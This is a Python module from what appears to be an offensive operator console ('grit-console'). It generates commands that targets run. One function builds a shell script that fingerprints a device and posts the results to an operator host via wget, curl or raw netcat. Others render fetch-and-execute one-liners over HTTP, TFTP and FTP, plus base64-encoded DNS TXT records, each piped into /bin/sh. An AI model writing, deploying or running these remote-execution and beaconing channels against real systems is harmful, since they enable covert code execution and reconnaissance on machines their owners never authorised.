"""Probe target command rendering helpers for grit-console."""

from .bridge_routes import target_route_context
from .operator_network import operator_advertised_host
from .shell_utils import shquote


def probe_route_context(cfg, host=None, port=None):
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = port or cfg.get("GRIT_PROBE_PORT", 22207)
    return target_route_context(cfg, "probe", direct_host=direct_host, direct_port=direct_port)


def probe_script_fn(cfg, host, port):
    name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    url = f"http://{host}:{port}/probe/result"
    return f"""#!/bin/sh
bb_sanitize() {{
    printf '%s' "$1" | tr ' /:&?=%' '_______'
}}
bb_uname_s=$(uname -s 2>/dev/null || printf unknown)
bb_uname_m=$(uname -m 2>/dev/null || printf unknown)
bb_uname_r=$(uname -r 2>/dev/null || printf unknown)
bb_word_bits=unknown
bb_endian=unknown
bb_probe_byte=unknown
bb_word_bits=$(getconf LONG_BIT 2>/dev/null) || bb_word_bits=unknown
if [ -z "$bb_word_bits" ] || [ "$bb_word_bits" = "unknown" ]; then
    bb_word_bits=unknown
    case "$bb_uname_m" in
        mips64*|aarch64|x86_64|amd64|ia64|ppc64*|s390x|riscv64) bb_word_bits=64 ;;
        mips|mipsel|armv*|i[3-6]86|i86pc|ppc|powerpc) bb_word_bits=32 ;;
    esac
fi
if command -v od >/dev/null 2>&1; then
    bb_probe_byte=$(printf '\\001\\000' | od -An -tx1 2>/dev/null | tr -d ' \\t\\n' | cut -c1-2)
fi
if [ "$bb_probe_byte" = "unknown" ] || [ -z "$bb_probe_byte" ]; then
    if command -v hexdump >/dev/null 2>&1; then
        bb_probe_byte=$(printf '\\001\\000' | hexdump -e '1/1 "%02x"' 2>/dev/null | cut -c1-2)
    fi
fi
case "$bb_probe_byte" in
    01) bb_endian=little ;;
    00) bb_endian=big ;;
esac
if [ "$bb_endian" = "unknown" ]; then
    case "$bb_uname_m" in
        mipsel|mips64el|x86_64|i[3-6]86|aarch64|armv*|amd64|riscv*|ppc64le) bb_endian=little ;;
        mips|mips64|ppc|ppc64|s390*|sparc*) bb_endian=big ;;
    esac
fi
bb_payload="schema=1&script={name}&uname_s=$(bb_sanitize "$bb_uname_s")&uname_m=$(bb_sanitize "$bb_uname_m")&uname_r=$(bb_sanitize "$bb_uname_r")&word_bits=$(bb_sanitize "$bb_word_bits")&endian=$(bb_sanitize "$bb_endian")"
printf '%s\\n' "grit probe"
printf '%s\\n' "uname_s=$bb_uname_s"
printf '%s\\n' "uname_m=$bb_uname_m"
printf '%s\\n' "uname_r=$bb_uname_r"
printf '%s\\n' "word_bits=$bb_word_bits"
printf '%s\\n' "endian=$bb_endian"
if command -v wget >/dev/null 2>&1; then
    wget -qO- --post-data "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
    wget -qO /dev/null --post-data "$bb_payload" "{url}" 2>/dev/null && exit 0
fi
if command -v curl >/dev/null 2>&1; then
    curl -fsS -X POST -d "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
fi
if command -v nc >/dev/null 2>&1; then
    bb_host=$(printf '%s' "{url}" | sed 's|http://||;s|/.*||;s|:.*||')
    bb_port=$(printf '%s' "{url}" | sed 's|http://[^:]*:||;s|/.*||')
    bb_path=$(printf '%s' "{url}" | sed 's|http://[^/]*/|/|')
    bb_len=$(printf '%s' "$bb_payload" | wc -c | tr -d ' ')
    printf 'POST %s HTTP/1.0\\r\\nHost: %s:%s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %s\\r\\nConnection: close\\r\\n\\r\\n%s' \\
        "$bb_path" "$bb_host" "$bb_port" "$bb_len" "$bb_payload" | nc "$bb_host" "$bb_port" >/dev/null 2>&1 && exit 0
fi
printf '%s\\n' "probe upload failed: no usable wget, curl, or nc" >&2
exit 1
"""


def render_probe_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    route = probe_route_context(cfg, host=host, port=port)
    url = f"http://{route.get('host', 'OPERATOR_IP')}:{route.get('port', 22207)}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_tftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    safe_local_name = script_name.replace("'", "").replace("/", "_") or "probe.sh"
    local_path = f"/tmp/{safe_local_name}"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_TFTP_PORT", 22208))
    return f"tftp -g -r {shquote(script_name)} -l {shquote(local_path)} {shquote(direct_host)} {shquote(str(direct_port))} && /bin/sh {shquote(local_path)}"


def render_probe_ftp_command(cfg, host=None, port=None):
    script_name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_FTP_PORT", 22209))
    url = f"ftp://{direct_host}:{direct_port}/{script_name}"
    return f"wget -O- {shquote(url)} | /bin/sh"


def render_probe_dns_command(cfg, host=None, port=None):
    dns_name = str(cfg.get("GRIT_PROBE_DNS_NAME", "probe.grit")).strip().strip(".") or "probe.grit"
    direct_host = operator_advertised_host(cfg, host=host)
    direct_port = int(port or cfg.get("GRIT_PROBE_DNS_PORT", 22210))
    if direct_port == 53:
        return f"nslookup -type=TXT {shquote(dns_name)} {shquote(direct_host)} | sed -n 's/.*\"\\(.*\\)\".*/\\1/p' | tr -d '\\n' | base64 -d | /bin/sh"
    return f"dig @{shquote(direct_host)} -p {shquote(str(direct_port))} +short TXT {shquote(dns_name)} | tr -d '\" \\n' | base64 -d | /bin/sh"
